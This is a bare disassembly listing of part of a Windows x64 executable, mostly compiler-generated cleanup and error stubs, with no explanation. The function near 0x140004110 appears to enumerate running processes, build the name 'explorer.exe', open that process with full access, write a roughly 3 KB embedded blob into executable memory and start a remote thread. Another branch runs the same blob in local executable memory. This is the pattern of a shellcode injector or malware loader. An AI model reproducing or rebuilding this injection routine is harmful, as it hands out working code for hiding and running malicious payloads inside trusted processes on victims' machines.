   140003c0e:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   140003c15:	72 19                	jb     0x140003c30
   140003c17:	48 83 c2 27          	add    $0x27,%rdx
   140003c1b:	48 8b 49 f8          	mov    -0x8(%rcx),%rcx
   140003c1f:	48 2b c1             	sub    %rcx,%rax
   140003c22:	48 83 c0 f8          	add    $0xfffffffffffffff8,%rax
   140003c26:	48 83 f8 1f          	cmp    $0x1f,%rax
   140003c2a:	0f 87 f5 01 00 00    	ja     0x140003e25
   140003c30:	e8 2b 62 00 00       	call   0x140009e60
   140003c35:	4c 89 7d 60          	mov    %r15,0x60(%rbp)
   140003c39:	48 c7 45 68 07 00 00 	movq   $0x7,0x68(%rbp)
   140003c40:	00 
   140003c41:	66 44 89 7d 50       	mov    %r15w,0x50(%rbp)
   140003c46:	48 8b 95 88 00 00 00 	mov    0x88(%rbp),%rdx
   140003c4d:	48 83 fa 08          	cmp    $0x8,%rdx
   140003c51:	72 36                	jb     0x140003c89
   140003c53:	48 8d 14 55 02 00 00 	lea    0x2(,%rdx,2),%rdx
   140003c5a:	00 
   140003c5b:	48 8b 4d 70          	mov    0x70(%rbp),%rcx
   140003c5f:	48 8b c1             	mov    %rcx,%rax
   140003c62:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   140003c69:	72 19                	jb     0x140003c84
   140003c6b:	48 83 c2 27          	add    $0x27,%rdx
   140003c6f:	48 8b 49 f8          	mov    -0x8(%rcx),%rcx
   140003c73:	48 2b c1             	sub    %rcx,%rax
   140003c76:	48 83 c0 f8          	add    $0xfffffffffffffff8,%rax
   140003c7a:	48 83 f8 1f          	cmp    $0x1f,%rax
   140003c7e:	0f 87 a7 01 00 00    	ja     0x140003e2b
   140003c84:	e8 d7 61 00 00       	call   0x140009e60
   140003c89:	4c 89 bd 80 00 00 00 	mov    %r15,0x80(%rbp)
   140003c90:	48 c7 85 88 00 00 00 	movq   $0x7,0x88(%rbp)
   140003c97:	07 00 00 00 
   140003c9b:	66 44 89 7d 70       	mov    %r15w,0x70(%rbp)
   140003ca0:	48 8b 95 e8 00 00 00 	mov    0xe8(%rbp),%rdx
   140003ca7:	48 83 fa 08          	cmp    $0x8,%rdx
   140003cab:	72 3a                	jb     0x140003ce7
   140003cad:	48 8d 14 55 02 00 00 	lea    0x2(,%rdx,2),%rdx
   140003cb4:	00 
   140003cb5:	48 8b 8d d0 00 00 00 	mov    0xd0(%rbp),%rcx
   140003cbc:	48 8b c1             	mov    %rcx,%rax
   140003cbf:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   140003cc6:	72 19                	jb     0x140003ce1
   140003cc8:	48 83 c2 27          	add    $0x27,%rdx
   140003ccc:	48 8b 49 f8          	mov    -0x8(%rcx),%rcx
   140003cd0:	48 2b c1             	sub    %rcx,%rax
   140003cd3:	48 83 c0 f8          	add    $0xfffffffffffffff8,%rax
   140003cd7:	48 83 f8 1f          	cmp    $0x1f,%rax
   140003cdb:	0f 87 50 01 00 00    	ja     0x140003e31
   140003ce1:	e8 7a 61 00 00       	call   0x140009e60
   140003ce6:	90                   	nop
   140003ce7:	48 8b 54 24 68       	mov    0x68(%rsp),%rdx
   140003cec:	48 83 fa 08          	cmp    $0x8,%rdx
   140003cf0:	72 37                	jb     0x140003d29
   140003cf2:	48 8d 14 55 02 00 00 	lea    0x2(,%rdx,2),%rdx
   140003cf9:	00 
   140003cfa:	48 8b 4c 24 50       	mov    0x50(%rsp),%rcx
   140003cff:	48 8b c1             	mov    %rcx,%rax
   140003d02:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   140003d09:	72 19                	jb     0x140003d24
   140003d0b:	48 83 c2 27          	add    $0x27,%rdx
   140003d0f:	48 8b 49 f8          	mov    -0x8(%rcx),%rcx
   140003d13:	48 2b c1             	sub    %rcx,%rax
   140003d16:	48 83 c0 f8          	add    $0xfffffffffffffff8,%rax
   140003d1a:	48 83 f8 1f          	cmp    $0x1f,%rax
   140003d1e:	0f 87 13 01 00 00    	ja     0x140003e37
   140003d24:	e8 37 61 00 00       	call   0x140009e60
   140003d29:	4c 89 7c 24 60       	mov    %r15,0x60(%rsp)
   140003d2e:	48 c7 44 24 68 07 00 	movq   $0x7,0x68(%rsp)
   140003d35:	00 00 
   140003d37:	66 44 89 7c 24 50    	mov    %r15w,0x50(%rsp)
   140003d3d:	48 8b 95 38 02 00 00 	mov    0x238(%rbp),%rdx
   140003d44:	48 83 fa 08          	cmp    $0x8,%rdx
   140003d48:	72 35                	jb     0x140003d7f
   140003d4a:	48 8d 14 55 02 00 00 	lea    0x2(,%rdx,2),%rdx
   140003d51:	00 
   140003d52:	48 8b 8d 20 02 00 00 	mov    0x220(%rbp),%rcx
   140003d59:	48 8b c1             	mov    %rcx,%rax
   140003d5c:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   140003d63:	72 15                	jb     0x140003d7a
   140003d65:	48 83 c2 27          	add    $0x27,%rdx
   140003d69:	48 8b 49 f8          	mov    -0x8(%rcx),%rcx
   140003d6d:	48 2b c1             	sub    %rcx,%rax
   140003d70:	48 83 c0 f8          	add    $0xfffffffffffffff8,%rax
   140003d74:	48 83 f8 1f          	cmp    $0x1f,%rax
   140003d78:	77 1c                	ja     0x140003d96
   140003d7a:	e8 e1 60 00 00       	call   0x140009e60
   140003d7f:	48 8b 9c 24 a0 28 00 	mov    0x28a0(%rsp),%rbx
   140003d86:	00 
   140003d87:	48 81 c4 60 28 00 00 	add    $0x2860,%rsp
   140003d8e:	41 5f                	pop    %r15
   140003d90:	41 5e                	pop    %r14
   140003d92:	5f                   	pop    %rdi
   140003d93:	5e                   	pop    %rsi
   140003d94:	5d                   	pop    %rbp
   140003d95:	c3                   	ret
   140003d96:	e8 85 10 01 00       	call   0x140014e20
   140003d9b:	90                   	nop
   140003d9c:	44 89 7c 24 78       	mov    %r15d,0x78(%rsp)
   140003da1:	b9 06 00 00 00       	mov    $0x6,%ecx
   140003da6:	e8 8d 4b 00 00       	call   0x140008938
   140003dab:	90                   	nop
   140003dac:	e8 6f 10 01 00       	call   0x140014e20
   140003db1:	90                   	nop
   140003db2:	e8 69 10 01 00       	call   0x140014e20
   140003db7:	90                   	nop
   140003db8:	e8 63 10 01 00       	call   0x140014e20
   140003dbd:	90                   	nop
   140003dbe:	e8 5d 10 01 00       	call   0x140014e20
   140003dc3:	90                   	nop
   140003dc4:	e8 57 10 01 00       	call   0x140014e20
   140003dc9:	90                   	nop
   140003dca:	e8 51 10 01 00       	call   0x140014e20
   140003dcf:	90                   	nop
   140003dd0:	e8 4b 10 01 00       	call   0x140014e20
   140003dd5:	90                   	nop
   140003dd6:	e8 45 10 01 00       	call   0x140014e20
   140003ddb:	90                   	nop
   140003ddc:	b9 01 00 00 00       	mov    $0x1,%ecx
   140003de1:	e8 52 4b 00 00       	call   0x140008938
   140003de6:	cc                   	int3
   140003de7:	8b c8                	mov    %eax,%ecx
   140003de9:	e8 0e 4b 00 00       	call   0x1400088fc
   140003dee:	90                   	nop
   140003def:	e8 2c 10 01 00       	call   0x140014e20
   140003df4:	90                   	nop
   140003df5:	e8 26 10 01 00       	call   0x140014e20
   140003dfa:	90                   	nop
   140003dfb:	e8 20 10 01 00       	call   0x140014e20
   140003e00:	90                   	nop
   140003e01:	e8 1a 10 01 00       	call   0x140014e20
   140003e06:	90                   	nop
   140003e07:	e8 14 10 01 00       	call   0x140014e20
   140003e0c:	90                   	nop
   140003e0d:	e8 0e 10 01 00       	call   0x140014e20
   140003e12:	90                   	nop
   140003e13:	e8 08 10 01 00       	call   0x140014e20
   140003e18:	90                   	nop
   140003e19:	e8 02 10 01 00       	call   0x140014e20
   140003e1e:	90                   	nop
   140003e1f:	e8 fc 0f 01 00       	call   0x140014e20
   140003e24:	90                   	nop
   140003e25:	e8 f6 0f 01 00       	call   0x140014e20
   140003e2a:	90                   	nop
   140003e2b:	e8 f0 0f 01 00       	call   0x140014e20
   140003e30:	90                   	nop
   140003e31:	e8 ea 0f 01 00       	call   0x140014e20
   140003e36:	90                   	nop
   140003e37:	e8 e4 0f 01 00       	call   0x140014e20
   140003e3c:	cc                   	int3
   140003e3d:	cc                   	int3
   140003e3e:	cc                   	int3
   140003e3f:	cc                   	int3
   140003e40:	40 53                	rex push %rbx
   140003e42:	48 83 ec 20          	sub    $0x20,%rsp
   140003e46:	48 8d 99 a8 00 00 00 	lea    0xa8(%rcx),%rbx
   140003e4d:	48 8b 83 58 ff ff ff 	mov    -0xa8(%rbx),%rax
   140003e54:	48 63 48 04          	movslq 0x4(%rax),%rcx
   140003e58:	48 8d 05 41 c1 03 00 	lea    0x3c141(%rip),%rax        # 0x14003ffa0
   140003e5f:	48 89 84 19 58 ff ff 	mov    %rax,-0xa8(%rcx,%rbx,1)
   140003e66:	ff 
   140003e67:	48 8b 83 58 ff ff ff 	mov    -0xa8(%rbx),%rax
   140003e6e:	48 63 48 04          	movslq 0x4(%rax),%rcx
   140003e72:	8d 91 58 ff ff ff    	lea    -0xa8(%rcx),%edx
   140003e78:	89 94 19 54 ff ff ff 	mov    %edx,-0xac(%rcx,%rbx,1)
   140003e7f:	48 8d 8b 60 ff ff ff 	lea    -0xa0(%rbx),%rcx
   140003e86:	e8 95 19 00 00       	call   0x140005820
   140003e8b:	48 8b 83 58 ff ff ff 	mov    -0xa8(%rbx),%rax
   140003e92:	48 63 50 04          	movslq 0x4(%rax),%rdx
   140003e96:	48 8d 05 7b c1 03 00 	lea    0x3c17b(%rip),%rax        # 0x140040018
   140003e9d:	48 89 84 1a 58 ff ff 	mov    %rax,-0xa8(%rdx,%rbx,1)
   140003ea4:	ff 
   140003ea5:	48 8b 83 58 ff ff ff 	mov    -0xa8(%rbx),%rax
   140003eac:	48 63 50 04          	movslq 0x4(%rax),%rdx
   140003eb0:	44 8d 42 f0          	lea    -0x10(%rdx),%r8d
   140003eb4:	44 89 84 1a 54 ff ff 	mov    %r8d,-0xac(%rdx,%rbx,1)
   140003ebb:	ff 
   140003ebc:	48 8d 05 45 c0 03 00 	lea    0x3c045(%rip),%rax        # 0x14003ff08
   140003ec3:	48 89 03             	mov    %rax,(%rbx)
   140003ec6:	48 8b cb             	mov    %rbx,%rcx
   140003ec9:	e8 de 50 00 00       	call   0x140008fac
   140003ece:	90                   	nop
   140003ecf:	48 83 c4 20          	add    $0x20,%rsp
   140003ed3:	5b                   	pop    %rbx
   140003ed4:	c3                   	ret
   140003ed5:	cc                   	int3
   140003ed6:	cc                   	int3
   140003ed7:	cc                   	int3
   140003ed8:	cc                   	int3
   140003ed9:	cc                   	int3
   140003eda:	cc                   	int3
   140003edb:	cc                   	int3
   140003edc:	cc                   	int3
   140003edd:	cc                   	int3
   140003ede:	cc                   	int3
   140003edf:	cc                   	int3
   140003ee0:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   140003ee5:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   140003eea:	48 89 4c 24 08       	mov    %rcx,0x8(%rsp)
   140003eef:	55                   	push   %rbp
   140003ef0:	48 8d ac 24 90 fe ff 	lea    -0x170(%rsp),%rbp
   140003ef7:	ff 
   140003ef8:	48 81 ec 70 02 00 00 	sub    $0x270,%rsp
   140003eff:	48 8b d9             	mov    %rcx,%rbx
   140003f02:	33 ff                	xor    %edi,%edi
   140003f04:	89 7c 24 50          	mov    %edi,0x50(%rsp)
   140003f08:	48 89 bd 88 01 00 00 	mov    %rdi,0x188(%rbp)
   140003f0f:	48 89 39             	mov    %rdi,(%rcx)
   140003f12:	48 89 79 10          	mov    %rdi,0x10(%rcx)
   140003f16:	48 c7 41 18 07 00 00 	movq   $0x7,0x18(%rcx)
   140003f1d:	00 
   140003f1e:	66 89 39             	mov    %di,(%rcx)
   140003f21:	c7 44 24 50 01 00 00 	movl   $0x1,0x50(%rsp)
   140003f28:	00 
   140003f29:	4c 8d 8d 88 01 00 00 	lea    0x188(%rbp),%r9
   140003f30:	45 33 c0             	xor    %r8d,%r8d
   140003f33:	33 d2                	xor    %edx,%edx
   140003f35:	48 8d 0d b4 c5 02 00 	lea    0x2c5b4(%rip),%rcx        # 0x1400304f0
   140003f3c:	ff 15 5e c4 02 00    	call   *0x2c45e(%rip)        # 0x1400303a0
   140003f42:	85 c0                	test   %eax,%eax
   140003f44:	78 3f                	js     0x140003f85
   140003f46:	48 8b 95 88 01 00 00 	mov    0x188(%rbp),%rdx
   140003f4d:	48 85 d2             	test   %rdx,%rdx
   140003f50:	74 33                	je     0x140003f85
   140003f52:	49 c7 c0 ff ff ff ff 	mov    $0xffffffffffffffff,%r8
   140003f59:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140003f60:	49 ff c0             	inc    %r8
   140003f63:	66 42 83 3c 42 00    	cmpw   $0x0,(%rdx,%r8,2)
   140003f69:	75 f5                	jne    0x140003f60
   140003f6b:	48 8b cb             	mov    %rbx,%rcx
   140003f6e:	e8 8d 26 00 00       	call   0x140006600
   140003f73:	48 8b 8d 88 01 00 00 	mov    0x188(%rbp),%rcx
   140003f7a:	ff 15 68 c4 02 00    	call   *0x2c468(%rip)        # 0x1400303e8
   140003f80:	e9 67 01 00 00       	jmp    0x1400040ec
   140003f85:	33 d2                	xor    %edx,%edx
   140003f87:	41 b8 08 02 00 00    	mov    $0x208,%r8d
   140003f8d:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   140003f92:	e8 f9 83 00 00       	call   0x14000c390
   140003f97:	48 8d 44 24 60       	lea    0x60(%rsp),%rax
   140003f9c:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140003fa1:	45 33 c9             	xor    %r9d,%r9d
   140003fa4:	45 33 c0             	xor    %r8d,%r8d
   140003fa7:	41 8d 51 2e          	lea    0x2e(%r9),%edx
   140003fab:	33 c9                	xor    %ecx,%ecx
   140003fad:	ff 15 e5 c3 02 00    	call   *0x2c3e5(%rip)        # 0x140030398
   140003fb3:	85 c0                	test   %eax,%eax
   140003fb5:	0f 88 15 01 00 00    	js     0x1400040d0
   140003fbb:	48 89 7c 24 30       	mov    %rdi,0x30(%rsp)
   140003fc0:	48 89 7c 24 40       	mov    %rdi,0x40(%rsp)
   140003fc5:	48 c7 44 24 48 07 00 	movq   $0x7,0x48(%rsp)
   140003fcc:	00 00 
   140003fce:	66 89 7c 24 30       	mov    %di,0x30(%rsp)
   140003fd3:	48 8d 44 24 60       	lea    0x60(%rsp),%rax
   140003fd8:	49 c7 c0 ff ff ff ff 	mov    $0xffffffffffffffff,%r8
   140003fdf:	90                   	nop
   140003fe0:	49 ff c0             	inc    %r8
   140003fe3:	66 42 83 3c 40 00    	cmpw   $0x0,(%rax,%r8,2)
   140003fe9:	75 f5                	jne    0x140003fe0
   140003feb:	48 8d 54 24 60       	lea    0x60(%rsp),%rdx
   140003ff0:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140003ff5:	e8 06 26 00 00       	call   0x140006600
   140003ffa:	90                   	nop
   140003ffb:	48 8b 4c 24 40       	mov    0x40(%rsp),%rcx
   140004000:	48 85 c9             	test   %rcx,%rcx
   140004003:	74 53                	je     0x140004058
   140004005:	48 8d 44 24 30       	lea    0x30(%rsp),%rax
   14000400a:	4c 8b 44 24 30       	mov    0x30(%rsp),%r8
   14000400f:	48 8b 54 24 48       	mov    0x48(%rsp),%rdx
   140004014:	48 83 fa 08          	cmp    $0x8,%rdx
   140004018:	49 0f 43 c0          	cmovae %r8,%rax
   14000401c:	66 83 7c 48 fe 5c    	cmpw   $0x5c,-0x2(%rax,%rcx,2)
   140004022:	74 34                	je     0x140004058
   140004024:	48 3b ca             	cmp    %rdx,%rcx
   140004027:	73 1f                	jae    0x140004048
   140004029:	48 8d 41 01          	lea    0x1(%rcx),%rax
   14000402d:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   140004032:	48 8d 44 24 30       	lea    0x30(%rsp),%rax
   140004037:	48 83 fa 08          	cmp    $0x8,%rdx
   14000403b:	49 0f 43 c0          	cmovae %r8,%rax
   14000403f:	c7 04 48 5c 00 00 00 	movl   $0x5c,(%rax,%rcx,2)
   140004046:	eb 10                	jmp    0x140004058
   140004048:	41 b9 5c 00 00 00    	mov    $0x5c,%r9d
   14000404e:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140004053:	e8 38 38 00 00       	call   0x140007890
   140004058:	48 8d 15 41 bb 03 00 	lea    0x3bb41(%rip),%rdx        # 0x14003fba0
   14000405f:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140004064:	e8 37 27 00 00       	call   0x1400067a0
   140004069:	48 8d 44 24 30       	lea    0x30(%rsp),%rax
   14000406e:	48 3b d8             	cmp    %rax,%rbx
   140004071:	74 1f                	je     0x140004092
   140004073:	48 8d 54 24 30       	lea    0x30(%rsp),%rdx
   140004078:	48 83 7c 24 48 08    	cmpq   $0x8,0x48(%rsp)
   14000407e:	48 0f 43 54 24 30    	cmovae 0x30(%rsp),%rdx
   140004084:	4c 8b 44 24 40       	mov    0x40(%rsp),%r8
   140004089:	48 8b cb             	mov    %rbx,%rcx
   14000408c:	e8 6f 25 00 00       	call   0x140006600
   140004091:	90                   	nop
   140004092:	48 8b 54 24 48       	mov    0x48(%rsp),%rdx
   140004097:	48 83 fa 08          	cmp    $0x8,%rdx
   14000409b:	72 33                	jb     0x1400040d0
   14000409d:	48 8d 14 55 02 00 00 	lea    0x2(,%rdx,2),%rdx
   1400040a4:	00 
   1400040a5:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
   1400040aa:	48 8b c1             	mov    %rcx,%rax
   1400040ad:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   1400040b4:	72 15                	jb     0x1400040cb
   1400040b6:	48 83 c2 27          	add    $0x27,%rdx
   1400040ba:	48 8b 49 f8          	mov    -0x8(%rcx),%rcx
   1400040be:	48 2b c1             	sub    %rcx,%rax
   1400040c1:	48 83 c0 f8          	add    $0xfffffffffffffff8,%rax
   1400040c5:	48 83 f8 1f          	cmp    $0x1f,%rax
   1400040c9:	77 39                	ja     0x140004104
   1400040cb:	e8 90 5d 00 00       	call   0x140009e60
   1400040d0:	48 83 7b 10 00       	cmpq   $0x0,0x10(%rbx)
   1400040d5:	75 15                	jne    0x1400040ec
   1400040d7:	41 b8 19 00 00 00    	mov    $0x19,%r8d
   1400040dd:	48 8d 15 d4 ba 03 00 	lea    0x3bad4(%rip),%rdx        # 0x14003fbb8
   1400040e4:	48 8b cb             	mov    %rbx,%rcx
   1400040e7:	e8 14 25 00 00       	call   0x140006600
   1400040ec:	48 8b c3             	mov    %rbx,%rax
   1400040ef:	4c 8d 9c 24 70 02 00 	lea    0x270(%rsp),%r11
   1400040f6:	00 
   1400040f7:	49 8b 5b 20          	mov    0x20(%r11),%rbx
   1400040fb:	49 8b 7b 28          	mov    0x28(%r11),%rdi
   1400040ff:	49 8b e3             	mov    %r11,%rsp
   140004102:	5d                   	pop    %rbp
   140004103:	c3                   	ret
   140004104:	e8 17 0d 01 00       	call   0x140014e20
   140004109:	cc                   	int3
   14000410a:	cc                   	int3
   14000410b:	cc                   	int3
   14000410c:	cc                   	int3
   14000410d:	cc                   	int3
   14000410e:	cc                   	int3
   14000410f:	cc                   	int3
   140004110:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   140004115:	55                   	push   %rbp
   140004116:	48 8d ac 24 60 fe ff 	lea    -0x1a0(%rsp),%rbp
   14000411d:	ff 
   14000411e:	48 81 ec a0 02 00 00 	sub    $0x2a0,%rsp
   140004125:	33 d2                	xor    %edx,%edx
   140004127:	8d 4a 02             	lea    0x2(%rdx),%ecx
   14000412a:	ff 15 20 bf 02 00    	call   *0x2bf20(%rip)        # 0x140030050
   140004130:	48 8b d8             	mov    %rax,%rbx
   140004133:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   140004137:	74 6a                	je     0x1400041a3
   140004139:	33 d2                	xor    %edx,%edx
   14000413b:	48 8d 4c 24 64       	lea    0x64(%rsp),%rcx
   140004140:	41 b8 34 02 00 00    	mov    $0x234,%r8d
   140004146:	e8 45 82 00 00       	call   0x14000c390
   14000414b:	48 8d 54 24 60       	lea    0x60(%rsp),%rdx
   140004150:	c7 44 24 60 38 02 00 	movl   $0x238,0x60(%rsp)
   140004157:	00 
   140004158:	48 8b cb             	mov    %rbx,%rcx
   14000415b:	ff 15 87 bf 02 00    	call   *0x2bf87(%rip)        # 0x1400300e8
   140004161:	85 c0                	test   %eax,%eax
   140004163:	74 35                	je     0x14000419a
   140004165:	66 66 66 0f 1f 84 00 	data16 data16 nopw 0x0(%rax,%rax,1)
   14000416c:	00 00 00 00 
   140004170:	48 8d 15 79 ba 03 00 	lea    0x3ba79(%rip),%rdx        # 0x14003fbf0
   140004177:	48 8d 4d 8c          	lea    -0x74(%rbp),%rcx
   14000417b:	e8 d0 ec 00 00       	call   0x140012e50
   140004180:	48 8b cb             	mov    %rbx,%rcx
   140004183:	85 c0                	test   %eax,%eax
   140004185:	0f 84 8a 00 00 00    	je     0x140004215
   14000418b:	48 8d 54 24 60       	lea    0x60(%rsp),%rdx
   140004190:	ff 15 ca be 02 00    	call   *0x2beca(%rip)        # 0x140030060
   140004196:	85 c0                	test   %eax,%eax
   140004198:	75 d6                	jne    0x140004170
   14000419a:	48 8b cb             	mov    %rbx,%rcx
   14000419d:	ff 15 d5 be 02 00    	call   *0x2bed5(%rip)        # 0x140030078
   1400041a3:	48 89 b4 24 b0 02 00 	mov    %rsi,0x2b0(%rsp)
   1400041aa:	00 
   1400041ab:	33 d2                	xor    %edx,%edx
   1400041ad:	33 f6                	xor    %esi,%esi
   1400041af:	c7 44 24 40 65 00 78 	movl   $0x780065,0x40(%rsp)
   1400041b6:	00 
   1400041b7:	c7 44 24 44 70 00 6c 	movl   $0x6c0070,0x44(%rsp)
   1400041be:	00 
   1400041bf:	c7 44 24 48 6f 00 72 	movl   $0x72006f,0x48(%rsp)
   1400041c6:	00 
   1400041c7:	c7 44 24 4c 65 00 72 	movl   $0x720065,0x4c(%rsp)
   1400041ce:	00 
   1400041cf:	8d 4e 02             	lea    0x2(%rsi),%ecx
   1400041d2:	c7 44 24 50 2e 00 65 	movl   $0x65002e,0x50(%rsp)
   1400041d9:	00 
   1400041da:	c7 44 24 54 78 00 65 	movl   $0x650078,0x54(%rsp)
   1400041e1:	00 
   1400041e2:	66 89 74 24 58       	mov    %si,0x58(%rsp)
   1400041e7:	ff 15 63 be 02 00    	call   *0x2be63(%rip)        # 0x140030050
   1400041ed:	48 8b d8             	mov    %rax,%rbx
   1400041f0:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   1400041f4:	0f 84 be 01 00 00    	je     0x1400043b8
   1400041fa:	48 8d 54 24 60       	lea    0x60(%rsp),%rdx
   1400041ff:	c7 44 24 60 38 02 00 	movl   $0x238,0x60(%rsp)
   140004206:	00 
   140004207:	48 8b c8             	mov    %rax,%rcx
   14000420a:	ff 15 d8 be 02 00    	call   *0x2bed8(%rip)        # 0x1400300e8
   140004210:	e9 7b 00 00 00       	jmp    0x140004290
   140004215:	ff 15 5d be 02 00    	call   *0x2be5d(%rip)        # 0x140030078
   14000421b:	33 c9                	xor    %ecx,%ecx
   14000421d:	ba c8 0b 00 00       	mov    $0xbc8,%edx
   140004222:	41 b8 00 30 00 00    	mov    $0x3000,%r8d
   140004228:	44 8d 49 40          	lea    0x40(%rcx),%r9d
   14000422c:	ff 15 96 be 02 00    	call   *0x2be96(%rip)        # 0x1400300c8
   140004232:	48 8d 15 67 36 04 00 	lea    0x43667(%rip),%rdx        # 0x1400478a0
   140004239:	41 b8 c8 0b 00 00    	mov    $0xbc8,%r8d
   14000423f:	48 8b c8             	mov    %rax,%rcx
   140004242:	48 8b d8             	mov    %rax,%rbx
   140004245:	e8 96 7a 00 00       	call   0x14000bce0
   14000424a:	ff d3                	call   *%rbx
   14000424c:	33 d2                	xor    %edx,%edx
   14000424e:	41 b8 00 80 00 00    	mov    $0x8000,%r8d
   140004254:	48 8b cb             	mov    %rbx,%rcx
   140004257:	48 8b 9c 24 c0 02 00 	mov    0x2c0(%rsp),%rbx
   14000425e:	00 
   14000425f:	48 81 c4 a0 02 00 00 	add    $0x2a0,%rsp
   140004266:	5d                   	pop    %rbp
   140004267:	48 ff 25 6a be 02 00 	rex.W jmp *0x2be6a(%rip)        # 0x1400300d8
   14000426e:	66 90                	xchg   %ax,%ax
   140004270:	48 8d 54 24 40       	lea    0x40(%rsp),%rdx
   140004275:	48 8d 4d 8c          	lea    -0x74(%rbp),%rcx
   140004279:	e8 d2 eb 00 00       	call   0x140012e50
   14000427e:	48 8b cb             	mov    %rbx,%rcx
   140004281:	85 c0                	test   %eax,%eax
   140004283:	74 1d                	je     0x1400042a2
   140004285:	48 8d 54 24 60       	lea    0x60(%rsp),%rdx
   14000428a:	ff 15 d0 bd 02 00    	call   *0x2bdd0(%rip)        # 0x140030060
   140004290:	85 c0                	test   %eax,%eax
   140004292:	75 dc                	jne    0x140004270
   140004294:	48 8b cb             	mov    %rbx,%rcx
   140004297:	ff 15 db bd 02 00    	call   *0x2bddb(%rip)        # 0x140030078
   14000429d:	e9 16 01 00 00       	jmp    0x1400043b8
   1400042a2:	48 89 bc 24 b8 02 00 	mov    %rdi,0x2b8(%rsp)
   1400042a9:	00 
   1400042aa:	8b 7c 24 68          	mov    0x68(%rsp),%edi
   1400042ae:	ff 15 c4 bd 02 00    	call   *0x2bdc4(%rip)        # 0x140030078
   1400042b4:	85 ff                	test   %edi,%edi
   1400042b6:	0f 84 f4 00 00 00    	je     0x1400043b0
   1400042bc:	44 8b c7             	mov    %edi,%r8d
   1400042bf:	ba 01 00 00 00       	mov    $0x1,%edx
   1400042c4:	b9 ff ff 1f 00       	mov    $0x1fffff,%ecx
   1400042c9:	ff 15 71 bd 02 00    	call   *0x2bd71(%rip)        # 0x140030040
   1400042cf:	48 8b d8             	mov    %rax,%rbx
   1400042d2:	48 85 c0             	test   %rax,%rax
   1400042d5:	0f 84 d5 00 00 00    	je     0x1400043b0
   1400042db:	33 d2                	xor    %edx,%edx
   1400042dd:	c7 44 24 20 40 00 00 	movl   $0x40,0x20(%rsp)
   1400042e4:	00 
   1400042e5:	41 b9 00 30 00 00    	mov    $0x3000,%r9d
   1400042eb:	41 b8 c8 0b 00 00    	mov    $0xbc8,%r8d
   1400042f1:	48 8b c8             	mov    %rax,%rcx
   1400042f4:	ff 15 86 bd 02 00    	call   *0x2bd86(%rip)        # 0x140030080
   1400042fa:	48 8b f8             	mov    %rax,%rdi
   1400042fd:	48 8b cb             	mov    %rbx,%rcx
   140004300:	48 85 c0             	test   %rax,%rax
   140004303:	0f 84 a1 00 00 00    	je     0x1400043aa
   140004309:	41 b9 c8 0b 00 00    	mov    $0xbc8,%r9d
   14000430f:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   140004314:	4c 8d 05 85 35 04 00 	lea    0x43585(%rip),%r8        # 0x1400478a0
   14000431b:	48 8b d0             	mov    %rax,%rdx
   14000431e:	ff 15 bc bd 02 00    	call   *0x2bdbc(%rip)        # 0x1400300e0
   140004324:	85 c0                	test   %eax,%eax
   140004326:	74 6a                	je     0x140004392
   140004328:	48 89 74 24 30       	mov    %rsi,0x30(%rsp)
   14000432d:	4c 8b cf             	mov    %rdi,%r9
   140004330:	89 74 24 28          	mov    %esi,0x28(%rsp)
   140004334:	45 33 c0             	xor    %r8d,%r8d
   140004337:	33 d2                	xor    %edx,%edx
   140004339:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   14000433e:	48 8b cb             	mov    %rbx,%rcx
   140004341:	ff 15 51 bd 02 00    	call   *0x2bd51(%rip)        # 0x140030098
   140004347:	48 8b f0             	mov    %rax,%rsi
   14000434a:	48 85 c0             	test   %rax,%rax
   14000434d:	74 43                	je     0x140004392
   14000434f:	ba ff ff ff ff       	mov    $0xffffffff,%edx
   140004354:	48 8b c8             	mov    %rax,%rcx
   140004357:	ff 15 13 bd 02 00    	call   *0x2bd13(%rip)        # 0x140030070
   14000435d:	48 8b ce             	mov    %rsi,%rcx
   140004360:	ff 15 12 bd 02 00    	call   *0x2bd12(%rip)        # 0x140030078
   140004366:	41 b9 00 80 00 00    	mov    $0x8000,%r9d
   14000436c:	45 33 c0             	xor    %r8d,%r8d
   14000436f:	48 8b d7             	mov    %rdi,%rdx
   140004372:	48 8b cb             	mov    %rbx,%rcx
   140004375:	ff 15 25 bd 02 00    	call   *0x2bd25(%rip)        # 0x1400300a0
   14000437b:	48 8b cb             	mov    %rbx,%rcx
   14000437e:	ff 15 f4 bc 02 00    	call   *0x2bcf4(%rip)        # 0x140030078
   140004384:	48 8d 0d 15 35 04 00 	lea    0x43515(%rip),%rcx        # 0x1400478a0
   14000438b:	e8 d0 5a 00 00       	call   0x140009e60
   140004390:	eb 1e                	jmp    0x1400043b0
   140004392:	41 b9 00 80 00 00    	mov    $0x8000,%r9d
   140004398:	45 33 c0             	xor    %r8d,%r8d
   14000439b:	48 8b d7             	mov    %rdi,%rdx
   14000439e:	48 8b cb             	mov    %rbx,%rcx
   1400043a1:	ff 15 f9 bc 02 00    	call   *0x2bcf9(%rip)        # 0x1400300a0
   1400043a7:	48 8b cb             	mov    %rbx,%rcx
   1400043aa:	ff 15 c8 bc 02 00    	call   *0x2bcc8(%rip)        # 0x140030078
   1400043b0:	48 8b bc 24 b8 02 00 	mov    0x2b8(%rsp),%rdi
   1400043b7:	00 
   1400043b8:	48 8b b4 24 b0 02 00 	mov    0x2b0(%rsp),%rsi
   1400043bf:	00 
   1400043c0:	48 8b 9c 24 c0 02 00 	mov    0x2c0(%rsp),%rbx
   1400043c7:	00 
